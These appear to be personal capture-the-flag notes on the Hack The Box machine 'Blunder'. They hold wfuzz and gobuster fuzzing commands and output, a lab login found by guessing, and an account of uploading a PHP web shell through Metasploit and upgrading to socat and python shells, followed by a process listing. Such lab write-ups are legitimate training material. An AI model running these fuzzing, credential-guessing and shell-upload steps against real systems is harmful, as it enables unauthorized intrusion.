@@ -1,0 +1,1510 @@
+//Blunder
+
+10.10.10.191/admin/login
+
+got stuck took a peek at walkthrough in a google search result description
+
+the words brute force were there
+
+attempt to bruteforce the login with rockyou and zapp. txt word list is too long
+doesn't work and not practical
+
+look at walkthrough more
+says the target is todo.txt and that wfuzz was best to find it
+
+otherwise on track with metasploit
+
+/scans done
+sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-content/FUZZ:FUZ2Z
+	sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-content/uploads/FUZZ:FUZ2Z
+	sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-content/pages/FUZZ:FUZ2Z
+	sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-content/tmp/FUZZ:FUZ2Z
+sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-kernel/FUZZ:FUZ2Z
+sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-languages/FUZZ:FUZ2Z
+sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-plugins/FUZZ:FUZ2Z
+/not done
+sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/bl-themes/FUZZ:FUZ2Z
+
+
+gobuster dir -q -v -w /usr/share/wordlists/fasttrack.txt 10.10.10.191/bl-content
+
+so i should have started at the top. I can't believe it was there. I looked for like 2 days. Anyway from the forums we know that fergus is the user
+
+"
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+"
+and "He has created probably the best fictional character RolandDeschain in The Dark tower series." sentence doesn't appear in the wiki entry from which the segment is copied. 
+
+it seems like a stretch to me that that would be the user... but oh well it worked.
+fergus
+RolandDeschain
+
+metasploit upload works, but execute won't start the reverse shell. I can access it by bringing up 10.10.10.191/whattheshell.php in browser
+however this netcat shell is also limited and can't cat user.txt
+first attempt at a shell upgrade did not work through "magic" however it looks like socat is on the victim computer
+got a socat session but still don't have admin priv
+
+meanwhile wfuzz still won't find todo.txt even though it's on the wordlist
+--------------------------
+kali@kali:~$ sudo wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/medium.txt -z file,/usr/share/wfuzz/wordlist/general/mutations_common.txt --hc 404 http://10.10.10.191/FUZZ:FUZ2Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ:FUZ2Z
+Total requests: 72996
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload   
+===================================================================
+
+
+Total time: 4047.177
+Processed Requests: 72996
+Filtered Requests: 72996
+Requests/sec.: 18.03627
+
+----------------------------
+
+
+
+////////////////////////////////////////////////////////////////////
+wfuzz answer
+
+kali@kali:~$ wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt -z file,/usr/share/wordlists/wfuzz/general/extensions_common.txt --sc 200 http://10.10.10.191/FUZZFUZ2Z
+
+Target: http://10.10.10.191/FUZZFUZ2Z
+Total requests: 84672
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload  
+===================================================================
+
+000003305:   200        70 L     157 W    2385 Ch     "admin - 
+                                                      /"       
+000038464:   200        0 L      5 W      30 Ch       "install 
+                                                      - .php"  
+000077139:   200        4 L      23 W     118 Ch      "todo - .
+                                                      txt"     
+
+/////////////////////////////////////////////////////////////////////
+
+
+
+
+
+logged back in a socat is gone but i got a tty shell with python and "magic"
+
+www-data@blunder:/$ cat /etc/issue
+Ubuntu 19.10 \n \l
+
+www-data@blunder:/$ cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=19.10
+DISTRIB_CODENAME=eoan
+DISTRIB_DESCRIPTION="Ubuntu 19.10"
+NAME="Ubuntu"
+VERSION="19.10 (Eoan Ermine)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 19.10"
+VERSION_ID="19.10"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=eoan
+UBUNTU_CODENAME=eoan
+
+www-data@blunder:/$ lpstat -a
+lpstat: No destinations added.
+
+www-data@blunder:/$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.2 167236 11136 ?        Ss   16:46   0:03 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    16:46   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        I<   16:46   0:00 [rcu_gp]
+root         4  0.0  0.0      0     0 ?        I<   16:46   0:00 [rcu_par_g
+root         6  0.0  0.0      0     0 ?        I<   16:46   0:00 [kworker/0
+root         9  0.0  0.0      0     0 ?        I<   16:46   0:00 [mm_percpu
+root        10  0.0  0.0      0     0 ?        S    16:46   0:15 [ksoftirqd
+root        11  0.0  0.0      0     0 ?        I    16:46   0:14 [rcu_sched
+root        12  0.0  0.0      0     0 ?        S    16:46   0:00 [migration
+root        13  0.0  0.0      0     0 ?        S    16:46   0:00 [idle_inje
+root        14  0.0  0.0      0     0 ?        S    16:46   0:00 [cpuhp/0]
+root        15  0.0  0.0      0     0 ?        S    16:46   0:00 [cpuhp/1]
+root        16  0.0  0.0      0     0 ?        S    16:46   0:00 [idle_inje
+root        17  0.0  0.0      0     0 ?        S    16:46   0:00 [migration
+root        18  0.0  0.0      0     0 ?        S    16:46   0:03 [ksoftirqd
+root        20  0.0  0.0      0     0 ?        I<   16:46   0:00 [kworker/1
+root        21  0.0  0.0      0     0 ?        S    16:46   0:00 [kdevtmpfs
+root        22  0.0  0.0      0     0 ?        I<   16:46   0:00 [netns]
+root        23  0.0  0.0      0     0 ?        S    16:46   0:00 [rcu_tasks
+root        24  0.0  0.0      0     0 ?        S    16:46   0:00 [kauditd]
+root        25  0.0  0.0      0     0 ?        S    16:46   0:00 [khungtask
+root        26  0.0  0.0      0     0 ?        S    16:46   0:00 [oom_reape
+root        27  0.0  0.0      0     0 ?        I<   16:46   0:00 [writeback
+root        28  0.0  0.0      0     0 ?        S    16:46   0:00 [kcompactd
+root        29  0.0  0.0      0     0 ?        SN   16:46   0:00 [ksmd]
+root        30  0.0  0.0      0     0 ?        SN   16:46   0:00 [khugepage
+root       123  0.0  0.0      0     0 ?        I<   16:46   0:00 [kintegrit
+root       124  0.0  0.0      0     0 ?        I<   16:46   0:00 [kblockd]
+root       125  0.0  0.0      0     0 ?        I<   16:46   0:00 [blkcg_pun
+root       126  0.0  0.0      0     0 ?        I<   16:46   0:00 [tpm_dev_w
+root       127  0.0  0.0      0     0 ?        I<   16:46   0:00 [ata_sff]
+root       128  0.0  0.0      0     0 ?        I<   16:46   0:00 [md]
+root       129  0.0  0.0      0     0 ?        I<   16:46   0:00 [edac-poll
+root       130  0.0  0.0      0     0 ?        I<   16:46   0:00 [devfreq_w
+root       131  0.0  0.0      0     0 ?        S    16:46   0:00 [watchdogd
+root       134  0.0  0.0      0     0 ?        S    16:46   0:01 [kswapd0]
+root       135  0.0  0.0      0     0 ?        I<   16:46   0:00 [kworker/u
+root       136  0.0  0.0      0     0 ?        S    16:46   0:00 [ecryptfs-
+root       139  0.0  0.0      0     0 ?        I<   16:46   0:00 [kthrotld]
+root       140  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/24-pc
+root       141  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/25-pc
+root       142  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/26-pc
+root       143  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/27-pc
+root       144  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/28-pc
+root       145  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/29-pc
+root       146  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/30-pc
+root       147  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/31-pc
+root       148  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/32-pc
+root       149  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/33-pc
+root       150  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/34-pc
+root       151  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/35-pc
+root       152  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/36-pc
+root       153  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/37-pc
+root       154  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/38-pc
+root       155  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/39-pc
+root       156  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/40-pc
+root       157  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/41-pc
+root       158  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/42-pc
+root       159  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/43-pc
+root       160  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/44-pc
+root       161  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/45-pc
+root       162  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/46-pc
+root       163  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/47-pc
+root       164  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/48-pc
+root       165  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/49-pc
+root       166  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/50-pc
+root       167  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/51-pc
+root       168  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/52-pc
+root       169  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/53-pc
+root       170  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/54-pc
+root       171  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/55-pc
+root       172  0.0  0.0      0     0 ?        I<   16:46   0:00 [acpi_ther
+root       173  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_0
+root       174  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       175  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       176  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       179  0.0  0.0      0     0 ?        I<   16:46   0:00 [ipv6_addr
+root       190  0.0  0.0      0     0 ?        I<   16:46   0:00 [kstrp]
+root       209  0.0  0.0      0     0 ?        I<   16:46   0:00 [charger_m
+root       260  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       261  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       262  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_3
+root       263  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       264  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_4
+root       265  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       266  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_5
+root       267  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       268  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_6
+root       269  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       270  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_7
+root       271  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       272  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_8
+root       273  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       274  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_9
+root       275  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       276  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       277  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       278  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       279  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       280  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       281  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       282  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       283  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       284  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       285  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       286  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       287  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       288  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       289  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       290  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       291  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       292  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       293  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       294  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_1
+root       295  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       296  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       297  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       298  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       299  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       300  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       301  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       302  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       303  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       304  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       305  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       306  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       307  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       308  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       309  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       310  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       311  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       312  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       313  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       314  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_2
+root       315  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       316  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_3
+root       317  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       318  0.0  0.0      0     0 ?        S    16:46   0:00 [scsi_eh_3
+root       319  0.0  0.0      0     0 ?        I<   16:46   0:00 [scsi_tmf_
+root       347  0.0  0.0      0     0 ?        I<   16:46   0:00 [kworker/0
+root       348  0.0  0.0      0     0 ?        I<   16:46   0:01 [kworker/1
+root       351  0.0  0.0      0     0 ?        I<   16:46   0:00 [kdmflush]
+root       352  0.0  0.0      0     0 ?        I<   16:46   0:00 [kdmflush]
+root       396  0.0  0.0      0     0 ?        S    16:46   0:01 [jbd2/dm-0
+root       397  0.0  0.0      0     0 ?        I<   16:46   0:00 [ext4-rsv-
+root       450  0.0  0.4  84328 20016 ?        S<s  16:46   0:02 /lib/syste
+root       458  0.0  0.0   2480   696 ?        S    16:46   0:00 bpfilter_u
+root       469  0.0  0.1  21268  5132 ?        Ss   16:46   0:01 /lib/syste
+root       488  0.0  0.0      0     0 ?        S    16:46   0:00 [irq/16-vm
+root       490  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop0]
+root       492  0.0  0.0      0     0 ?        I<   16:46   0:00 [ttm_swap]
+root       506  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop1]
+root       511  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop2]
+root       513  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop3]
+root       526  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop4]
+root       530  0.0  0.0 224516   312 ?        Ssl  16:46   0:00 vmware-vmb
+root       535  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop5]
+root       548  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop6]
+root       550  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop7]
+root       586  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop8]
+root       587  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop9]
+root       588  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop10]
+root       593  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop11]
+root       594  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop12]
+root       598  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop13]
+root       599  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop14]
+root       600  0.0  0.0      0     0 ?        S<   16:46   0:00 [loop15]
+systemd+   642  0.0  0.1  92072  6396 ?        Ssl  16:46   0:02 /lib/syste
+root       643  0.0  0.2  50128 10308 ?        Ss   16:46   0:00 /usr/bin/V
+systemd+   645  0.0  0.2  21104 10164 ?        Ss   16:46   0:03 /lib/syste
+root       648  0.1  0.3 172524 14664 ?        S<sl 16:46   0:23 /usr/bin/v
+root       716  0.0  0.0      0     0 ?        I<   16:46   0:00 [cryptd]
+root       903  0.0  0.0   2528   840 ?        Ss   16:46   0:00 /usr/sbin/
+root       909  0.0  0.3 393148 12412 ?        Ssl  16:46   0:00 /usr/lib/u
+syslog     910  0.0  0.1 224360  4624 ?        Ssl  16:46   0:00 /usr/sbin/
+root       911  0.0  0.1  16432  7416 ?        Ss   16:46   0:00 /lib/syste
+root       916  0.0  0.0  81876  3808 ?        Ssl  16:46   0:00 /usr/sbin/
+root       917  0.0  0.4  38704 19864 ?        Ss   16:46   0:00 /usr/bin/p
+message+   921  0.0  0.1   8880  5700 ?        Ss   16:46   0:03 /usr/bin/d
+root       926  0.0  0.1  13624  4972 ?        Ss   16:46   0:00 /sbin/wpa_
+root       928  0.0  0.4 749396 19384 ?        Ssl  16:46   0:03 /usr/sbin/
+root       935  0.0  0.1 238168  7040 ?        Ssl  16:46   0:00 /usr/lib/a
+root       938  0.0  0.5 1151364 24068 ?       Ssl  16:46   0:04 /usr/lib/s
+root       939  0.0  0.0   9404  2856 ?        Ss   16:46   0:00 /usr/sbin/
+root       942  0.0  0.2 313372 10276 ?        Ssl  16:46   0:00 /usr/sbin/
+avahi      946  0.0  0.0   8536  3312 ?        Ss   16:46   0:00 avahi-daem
+avahi     1019  0.0  0.0   8348   320 ?        S    16:46   0:00 avahi-daem
+root      1022  0.0  0.3 181628 12396 ?        Ssl  16:46   0:00 /usr/sbin/
+root      1026  0.0  0.2 235080  8960 ?        Ssl  16:46   0:01 /usr/lib/p
+root      1081  0.0  0.2 239532  8476 ?        Ssl  16:46   0:00 /usr/sbin/
+root      1091  0.0  0.8 157096 35524 ?        Ss   16:46   0:05 /usr/sbin/
+root      1137  0.0  0.2  27696  8232 ?        Ss   16:46   0:00 /usr/sbin/
+lp        1142  0.0  0.1  15112  6556 ?        S    16:46   0:00 /usr/lib/c
+root      1148  0.0  0.5 117676 22928 ?        Ssl  16:46   0:00 /usr/bin/p
+root      1151  0.0  0.2 166588  8672 ?        Sl   16:46   0:00 gdm-sessio
+shaun     1178  0.0  0.2  18920 10072 ?        Ss   16:46   0:00 /lib/syste
+shaun     1179  0.0  0.0 103048  3180 ?        S    16:46   0:00 (sd-pam)
+shaun     1193  0.0  0.3 809200 15224 ?        S<sl 16:46   0:00 /usr/bin/p
+shaun     1196  0.0  0.1 240100  6720 ?        SLl  16:46   0:00 /usr/bin/g
+shaun     1200  0.0  0.1 163948  6364 tty2     Ssl+ 16:46   0:00 /usr/lib/g
+shaun     1202  0.0  1.1 359160 47792 tty2     Sl+  16:46   0:02 /usr/lib/x
+rtkit     1279  0.0  0.0 152872  2896 ?        SNsl 16:46   0:00 /usr/libex
+shaun     1285  0.0  0.1   8452  5404 ?        Ss   16:46   0:00 /usr/bin/d
+shaun     1291  0.0  0.3 189568 13716 tty2     Sl+  16:46   0:00 /usr/lib/g
+shaun     1359  0.0  0.0   6000   452 ?        Ss   16:46   0:00 /usr/bin/s
+shaun     1379  0.0  0.1 239704  7540 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1384  0.0  0.1 378260  6188 ?        Sl   16:46   0:00 /usr/lib/g
+shaun     1409  0.0  0.1 305304  6412 ?        Ssl  16:46   0:00 /usr/lib/a
+shaun     1414  0.0  0.0   7244  4012 ?        S    16:46   0:00 /usr/bin/d
+shaun     1423  0.0  0.1 162788  6164 ?        Sl   16:46   0:00 /usr/lib/a
+shaun     1433  0.0  0.2 465160 12064 ?        Ssl  16:46   0:00 /usr/libex
+shaun     1438  0.0  0.1 457324  5948 ?        Ssl  16:46   0:00 /usr/libex
+shaun     1441  0.0  0.1 235536  5764 ?        Ssl  16:46   0:00 /usr/libex
+shaun     1450  0.0  0.6 493972 27448 ?        Ssl  16:46   0:00 /usr/libex
+shaun     1460  0.0  0.1 156164  5332 ?        Sl   16:46   0:00 /usr/lib/d
+shaun     1471  0.0  0.1  89956  4224 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1477  0.0  0.3 624764 15520 ?        Ssl  16:46   0:00 /usr/lib/g
+whoopsie  1489  0.0  0.3 256856 15104 ?        Ssl  16:46   0:00 /usr/bin/w
+kernoops  1491  0.0  0.0  11136   440 ?        Ss   16:46   0:00 /usr/sbin/
+kernoops  1493  0.0  0.0  11136   440 ?        Ss   16:46   0:00 /usr/sbin/
+shaun     1505  0.1  7.1 2623500 289224 ?      Ssl  16:46   0:30 /usr/bin/g
+shaun     1531  0.0  0.6 548376 25240 ?        Sl   16:46   0:00 /usr/lib/g
+shaun     1535  0.0  0.7 1046576 30416 ?       Ssl  16:46   0:00 /usr/libex
+shaun     1544  0.0  0.8 571036 35772 ?        Sl   16:46   0:00 /usr/lib/g
+root      1547  0.0  0.2 251936  9160 ?        Ssl  16:46   0:00 /usr/lib/u
+shaun     1555  0.0  0.2 314688  8648 ?        Sl   16:46   0:00 /usr/lib/g
+shaun     1567  0.0  0.2 313768  9028 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1572  0.0  0.1 238024  6700 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1576  0.0  0.1 235840  5908 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1580  0.0  0.2 316560  8472 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1585  0.0  0.1 235628  5972 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1607  0.0  0.1 458316  7864 ?        Sl   16:46   0:00 ibus-daemo
+shaun     1629  0.0  0.1 162640  6712 ?        Sl   16:46   0:00 /usr/lib/i
+shaun     1630  0.0  0.7 275724 30440 ?        Sl   16:46   0:02 /usr/lib/i
+shaun     1633  0.0  0.1 313712  7588 ?        Sl   16:46   0:00 /usr/lib/g
+shaun     1635  0.0  0.6 198592 27188 ?        Sl   16:46   0:00 /usr/lib/i
+shaun     1640  0.0  0.1 236308  6916 ?        Sl   16:46   0:00 /usr/lib/i
+shaun     1654  0.0  0.8 880408 34948 ?        Ssl  16:46   0:00 /usr/libex
+shaun     1670  0.0  0.7 707384 31116 ?        Ssl  16:46   0:00 /usr/libex
+shaun     1680  0.0  0.1 457108  5864 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1681  0.0  0.6 420816 28160 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1682  0.0  0.1 235520  5984 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1683  0.0  0.2 314956  9812 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1684  0.0  0.7 568924 28348 ?        Ssl  16:46   0:02 /usr/lib/g
+shaun     1686  0.0  0.2 319136  8712 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1695  0.0  0.6 346044 27036 ?        Ssl  16:46   0:01 /usr/lib/g
+shaun     1696  0.0  0.3 374736 16004 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1700  0.0  0.6 346568 27476 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1704  0.0  0.2 464708 10160 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1705  0.0  0.7 688228 29592 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1706  0.0  0.6 347112 28104 ?        Ssl  16:46   0:02 /usr/lib/g
+shaun     1707  0.0  0.2 247868 10824 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1711  0.0  0.1 313924  7820 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1712  0.0  0.1 309632  6452 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1715  0.0  0.1 311696  7544 ?        Ssl  16:46   0:00 /usr/lib/g
+shaun     1723  0.0  1.5 749648 64092 ?        Sl   16:46   0:00 /usr/libex
+shaun     1733  0.2  0.9 217908 40148 ?        Sl   16:46   1:01 /usr/bin/v
+shaun     1740  0.0  0.6 541596 24640 ?        SNl  16:46   0:00 /usr/lib/t
+shaun     1742  0.0  0.1 231716  5964 ?        Sl   16:46   0:00 /usr/lib/g
+shaun     1828  0.0  0.3 343244 13244 ?        Sl   16:46   0:00 /usr/lib/g
+colord    1832  0.0  0.3 246060 14032 ?        Ssl  16:46   0:00 /usr/lib/c
+shaun     1859  0.0  0.1 162628  6752 ?        Sl   16:46   0:00 /usr/lib/i
+www-data  2002  0.0  0.0   2600   848 ?        S    16:47   0:00 /bin/sh
+www-data  2025  0.0  0.1  10180  7068 ?        S    16:47   0:00 python -c 
+www-data  2026  0.0  0.0   4216  3300 pts/0    Ss   16:47   0:00 /bin/bash
+shaun     2046  0.0  0.1 162136  6116 ?        Ssl  16:47   0:00 /usr/lib/g
+shaun     2049  0.0  0.6 272232 26804 ?        Sl   16:47   0:00 update-not
+shaun     2070  0.0  3.2 1023732 129440 ?      SLl  16:47   0:02 /usr/bin/g
+root      2086  0.0  0.1 238356  7412 ?        Ssl  16:47   0:00 /usr/lib/b
+root      2100  0.0  0.0   5212  2988 pts/0    S    16:47   0:00 su hugo
+hugo      2120  0.0  0.2  18488  9532 ?        Ss   16:47   0:00 /lib/syste
+hugo      2121  0.0  0.0 103048  3180 ?        S    16:47   0:00 (sd-pam)
+hugo      2141  0.0  0.3 282268 14300 ?        Ssl  16:47   0:00 /usr/bin/p
+hugo      2142  0.0  0.1  10604  4520 pts/0    S    16:47   0:00 bash
+hugo      2151  0.0  0.0   7116  3484 ?        Ss   16:47   0:00 /usr/bin/d
+root      2153  0.0  0.0   9812  3804 pts/0    S+   16:48   0:00 /bin/bash
+www-data  3405  0.1  0.5 163596 22768 ?        S    19:11   0:20 /usr/sbin/
+www-data  3472  0.0  0.0      0     0 ?        Z    19:22   0:00 [sh] <defu
+www-data 11517  0.0  0.0      0     0 ?        Z    19:27   0:00 [sh] <defu
+www-data 11540  0.0  0.0   2600   848 ?        S    19:30   0:00 sh -c /bin
+www-data 11541  0.0  0.0   2600   848 ?        S    19:30   0:00 /bin/sh
+www-data 11570  0.0  0.1  10308  7184 ?        S    19:31   0:00 python -c 
+www-data 11571  0.0  0.0   4084  3336 pts/1    Ss   19:31   0:00 bin/bash
+root     11821  0.0  0.0   5212  2988 pts/1    S    19:43   0:00 su hugo
+hugo     11822  0.0  0.1  10600  4664 pts/1    S    19:43   0:00 bash
+root     11997  0.0  0.0   9680  3720 pts/1    S+   19:46   0:00 /bin/bash
+www-data 12014  0.0  0.6 167816 26008 ?        S    19:51   0:11 /usr/sbin/
+root     12148  0.0  0.0      0     0 ?        I    20:09   0:04 [kworker/0
+www-data 12211  0.0  0.6 167932 25992 ?        S    20:12   0:00 /usr/sbin/
+www-data 12213  0.3  0.7 167888 28252 ?        S    20:13   0:33 /usr/sbin/
+www-data 12426  0.0  0.0      0     0 ?        Z    20:49   0:00 [sh] <defu
+www-data 12428  0.0  0.1  11632  5700 ?        S    20:49   0:00 perl -MIO 
+www-data 12441  0.0  0.0   2600   848 ?        S    21:04   0:00 sh -c /bin
+www-data 12442  0.0  0.0   2600   848 ?        S    21:04   0:00 /bin/sh
+www-data 12446  0.0  0.1  10312  7076 ?        S    21:06   0:00 python -c 
